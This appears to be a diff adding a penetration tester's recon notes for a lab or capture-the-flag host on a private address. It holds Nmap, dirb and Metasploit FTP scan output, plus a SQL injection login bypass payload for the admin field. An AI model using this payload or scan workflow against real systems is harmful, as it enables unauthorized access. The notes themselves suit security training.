@@ -1,0 +1,58 @@
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-01 03:41 EDT
+Nmap scan report for wow.eversec.rocks (192.168.0.225)
+Host is up (0.0026s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     FileZilla ftpd
+80/tcp open  http    Thin httpd
+|_http-server-header: thin
+|_http-title: Site doesn't have a title (text/plain).
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+INJECTION: admin: '/**/OR/**/1=1--
+            anything for password
+
+dirb
+------
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat Jun  1 16:59:50 2019
+URL_BASE: http://192.168.0.225/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.0.225/ ----
++ http://192.168.0.225/about (CODE:200|SIZE:2358)                              
++ http://192.168.0.225/admin (CODE:200|SIZE:1998)                              
++ http://192.168.0.225/api (CODE:500|SIZE:0)                                   
++ http://192.168.0.225/dev (CODE:500|SIZE:0)                                   
++ http://192.168.0.225/favicon.ico (CODE:200|SIZE:15265)                       
++ http://192.168.0.225/home (CODE:200|SIZE:1885)                               
++ http://192.168.0.225/login (CODE:405|SIZE:0)                                 
++ http://192.168.0.225/test (CODE:200|SIZE:20)                                 
++ http://192.168.0.225/update (CODE:405|SIZE:0)                                
++ http://192.168.0.225/user (CODE:500|SIZE:0)                                  
++ http://192.168.0.225/users (CODE:500|SIZE:0)                                 
+                                                                               
+-----------------
+END_TIME: Sat Jun  1 17:00:37 2019
+DOWNLOADED: 4612 - FOUND: 11
+
+
+msf5 auxiliary(scanner/ftp/anonymous) > use auxiliary/scanner/ftp/ftp_version 
+msf5 auxiliary(scanner/ftp/ftp_version) > set rhosts 192.168.0.225
+rhosts => 192.168.0.225
+msf5 auxiliary(scanner/ftp/ftp_version) > run
+
+[+] 192.168.0.225:21      - FTP Banner: '220 Welcome to wow.eversec.rocks! Gr33tzFr0mL3g10n Free file storage via /var/tmp 2.1.0\x0d\x0a'
+[*] 192.168.0.225:21      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+Sinatra
